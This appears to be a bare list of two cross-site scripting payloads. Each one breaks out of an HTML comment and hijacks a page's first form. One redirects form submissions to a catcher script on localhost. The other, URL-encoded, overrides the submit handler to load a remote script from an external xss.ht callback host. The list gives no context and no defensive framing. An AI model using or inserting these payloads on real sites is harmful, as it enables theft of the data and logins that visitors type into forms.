Payloads:

--><script>a=document.forms[0];a.method="GET";a.action="http://localhost:8080/xss_catch_form.php"</script><!--

--%3E%3Cscript%3Edocument.forms[0].onsubmit=function(){z=document.createElement(%27script%27);z.src=%27https://malipek.xss.ht%27;document.body.appendChild(z);return%20false;}%3C/script%3E%3C!--
